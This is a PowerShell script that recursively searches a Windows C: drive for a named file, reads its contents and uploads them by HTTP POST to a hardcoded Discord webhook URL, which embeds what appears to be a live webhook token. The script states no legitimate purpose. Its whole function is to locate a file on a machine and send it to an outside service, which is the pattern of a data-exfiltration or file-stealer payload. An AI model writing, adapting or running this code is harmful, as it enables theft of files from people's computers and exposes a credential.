# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1149830168903438358/9Doq-cehv0fkinqLVAg3wrGdtpNqCs0j8rM_OEuh1PQn6B8EstGbTZF8QGwsyT4sqVxS"

# File name to search for
# $fileNameToSearch = "testingtetsing.txt"

try {
    # Search for the file in the C drive
    $fileToUpload = Get-ChildItem -Path "C:\" -Recurse -Filter $fileNameToSearch | Select-Object -First 1 -ExpandProperty FullName

    if ($fileToUpload -ne $null) {
        # Read the file content
        $fileContent = Get-Content -Path $fileToUpload -Raw

        # Create the boundary for the multipart form data
        $boundary = [System.Guid]::NewGuid().ToString()

        # Construct the multipart form data body
        $bodyLines = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileNameToSearch"
Content-Type: text/plain

$fileContent
--$boundary--
"@

        # Convert the body to a byte array
        $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyLines)

        # Construct the web request
        $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
        $webRequest.Method = "POST"
        $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
        $webRequest.ContentLength = $bodyBytes.Length

        # Write the body to the request stream
        $requestStream = $webRequest.GetRequestStream()
        $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        $requestStream.Close()

        # Get the response
        $response = $webRequest.GetResponse()
        $responseStream = $response.GetResponseStream()
        $responseReader = New-Object System.IO.StreamReader($responseStream)
        $responseContent = $responseReader.ReadToEnd()

        # Debugging output
        Write-Output "Response content: $responseContent"

        # Clean up
        $responseReader.Close()
        $responseStream.Close()
        $response.Close()
    } else {
        Write-Output "File '$fileNameToSearch' not found in C drive."
    }
} catch {
    # Catch and display any errors
    Write-Output "Error: $_"
}
